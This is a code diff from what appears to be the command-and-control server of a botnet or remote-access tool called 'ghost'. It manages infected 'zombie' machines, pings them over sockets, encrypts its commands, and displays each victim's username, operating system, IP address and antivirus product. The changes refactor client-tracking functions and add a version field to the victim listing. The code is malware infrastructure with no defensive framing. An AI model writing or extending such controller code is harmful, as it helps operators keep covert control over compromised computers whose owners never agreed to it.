@@ -53,8 +53,9 @@ DWORD WINAPI			t_gui(LPVOID params);
 DWORD WINAPI			t_window(LPVOID params);
 void					onServerClientConnect(SOCKET clientSocket, CLIENTDATA info);
 void					refreshClients();
+void					getAntivirus();
 void					onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data);
-vector<std::string>		split(const std::string &s, char delim);
+vector<string>			split(const string &s, char delim);
 string					real_ip();
 
 char *					c_ascii;
@@ -72,7 +73,7 @@ AHXRSERVER				a_server;
 #pragma comment			(lib, "Wininet.lib")
 #pragma comment			(lib, "user32.lib")
 
-void getAntivirus();
+
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow) 
 {
@@ -83,43 +84,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline,
 	while (b_gui_active) // This is to prevent this program from closing; but instead, run in the background.
 		Sleep(1000);
     return 0;
-}
-
-
-void refreshClients() {
-	ghostlib::_clientData	client_data;
-	int i_res;
-
-	for (int i = 0; i < ghostlib::getZombieCount(); i++) {
-		client_data = ghostlib::getZombieData(i);
-
-		if (client_data.socketRef == INVALID_SOCKET) {
-			ghostlib::deleteZombie(i);
-			continue;
-		}
-
-		/*char buf;
-		int err = recv(client_data.socketRef, &buf, 1, MSG_PEEK | MSG_DONTWAIT);
-		if (err == SOCKET_ERROR)
-			if (WSAGetLastError() != WSAEWOULDBLOCK)
-				ghostlib::deleteZombie(i);
-		*/
-		
-		i_res = send(client_data.socketRef, "ghost_ping", 10, 0 ); // Testing if socket is active. Will never respond.
-
-		if (i_res == SOCKET_ERROR)
-			ghostlib::deleteZombie(i);
-		
-	}
-}
-
-DWORD WINAPI t_window(LPVOID params) {
-	System::Windows::Forms::Application::EnableVisualStyles();
-	System::Windows::Forms::Application::SetCompatibleTextRenderingDefault(false);
-	server::gui frm;
-	System::Windows::Forms::Application::Run(%frm);
-	b_gui_active = false;
-	return 0;
 }
 
 DWORD WINAPI t_gui(LPVOID params) {
@@ -228,7 +192,7 @@ DWORD WINAPI t_gui(LPVOID params) {
 
 							SHOW_GHOST();
 							LOG("----------------------------------");
-							LOG("[COLOR:YELLOW]You have selected \"%s\" (%s:%s)", j_data["ID"].get<std::string>().c_str(), j_data["IP"].get<std::string>().c_str(), j_data["PORT"].get<std::string>().c_str());
+							LOG("[COLOR:YELLOW]You have selected \"%s\" (%s:%s) [V%s]", j_data["ID"].get<std::string>().c_str(), j_data["IP"].get<std::string>().c_str(), j_data["PORT"].get<std::string>().c_str(), j_data["VERSION"].get<std::string>().c_str());
 							LOG("[COLOR:CYAN][Username]: %s", j_data["USER"].get<std::string>().c_str());
 							LOG("[COLOR:LIGHTGREEN][Operating System]: %s", j_data["OS"].get<std::string>().c_str());
 							LOG("[COLOR:RED][Antivirus]: %s", j_data["AV"].get<std::string>().c_str());
@@ -455,6 +419,35 @@ void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data) {
 		ghostlib::parseZombie(clientSocket, i_zombie_idx, new_data);
 	}
 }
+
+void refreshClients() {
+	ghostlib::_clientData	client_data;
+	int i_res;
+
+	for (int i = 0; i < ghostlib::getZombieCount(); i++) {
+		client_data = ghostlib::getZombieData(i);
+
+		if (client_data.socketRef == INVALID_SOCKET) {
+			ghostlib::deleteZombie(i);
+			continue;
+		}
+		i_res = send(client_data.socketRef, encryptCMD(string("ghost_ping")).c_str(), 10, 0); // Testing if socket is active. Will never respond.
+
+		if (i_res == SOCKET_ERROR)
+			ghostlib::deleteZombie(i);
+
+	}
+}
+
+DWORD WINAPI t_window(LPVOID params) {
+	System::Windows::Forms::Application::EnableVisualStyles();
+	System::Windows::Forms::Application::SetCompatibleTextRenderingDefault(false);
+	server::gui frm;
+	System::Windows::Forms::Application::Run(%frm);
+	b_gui_active = false;
+	return 0;
+}
+
 
 template<typename Out>
 void split(const std::string &s, char delim, Out result) {
